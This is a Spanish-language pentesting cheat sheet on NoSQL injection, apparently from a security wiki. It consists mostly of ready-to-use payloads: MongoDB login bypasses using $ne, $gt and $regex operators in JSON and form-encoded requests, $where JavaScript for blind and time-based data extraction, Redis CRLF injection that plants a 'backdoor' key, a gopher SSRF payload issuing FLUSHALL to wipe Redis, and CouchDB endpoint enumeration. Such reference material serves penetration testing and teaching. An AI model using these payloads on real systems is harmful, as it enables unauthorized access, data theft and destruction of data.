---
icon: database
---

# NoSQL Injection

Las bases de datos NoSQL (MongoDB principalmente) tienen su propio lenguaje de consulta. Si el input del usuario se inserta directamente en los objetos de consulta, se puede manipular la lógica.

#### MongoDB - Bypass de autenticación

```javascript
// Código vulnerable (Node.js)
db.users.findOne({
    username: req.body.username,
    password: req.body.password
});

// Petición normal
POST /login
{"username": "admin", "password": "secreto"}

// Inyección con operadores MongoDB
POST /login
{"username": "admin", "password": {"$ne": ""}}
// $ne → "not equal" → la contraseña es ≠ "" → siempre true → bypass

// Otros operadores útiles
{"$ne": null}           // ≠ null → cualquier valor
{"$gt": ""}             // > "" → cualquier string no vacío
{"$gte": ""}            // >= ""
{"$regex": ".*"}        // regex que coincide con todo
{"$nin": [""]}          // not in → cualquier valor que no sea ""
{"$exists": true}       // el campo existe → siempre true si hay contraseña
```

#### MongoDB en formularios con URL encoding

```bash
# Si la app usa Content-Type: application/x-www-form-urlencoded
# Los arrays y objetos se pasan con notación de brackets

# username=admin&password[$ne]=
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=

# username=admin&password[$gt]=
username=admin&password[$gt]=

# Con regex para buscar usuarios que empiecen por 'a'
username[$regex]=a.*&password[$ne]=

# Array: username[$in][]=admin&username[$in][]=root
```

#### MongoDB - Extracción de datos con $where

```javascript
// $where evalúa JavaScript en el servidor
{"$where": "function() { return true; }"}
{"$where": "this.username == 'admin'"}
{"$where": "this.password.length > 0"}

// Blind: inferir datos carácter a carácter
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^a/)"}

// Time-based (sleep para confirmar)
{"$where": "function() { sleep(5000); return true; }"}
```

#### Redis Injection

```bash
# Si la app usa Redis como base de datos de sesiones y el input va a comandos Redis

# Inyectar comandos CRLF en parámetros que forman comandos Redis
username=user%0d%0aSET%20backdoor%20attacker%0d%0a
# Inyecta: SET backdoor attacker en Redis

# Via gopher en SSRF (ver sección SSRF)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
```

#### CouchDB

```bash
# Si la app consulta CouchDB directamente
# Manipular el selector de Mango Query
{"selector": {"username": "admin", "password": {"$gt": ""}}}

# Acceso directo a la API si está expuesta
http://target.com:5984/_all_dbs
http://target.com:5984/users/_all_docs
```

&#x20;

> NoSQL injection con `$ne` es trivialmente explotable en cualquier app MongoDB sin parametrizar — es el equivalente a `' OR 1=1--` de SQLi pero para MongoDB.
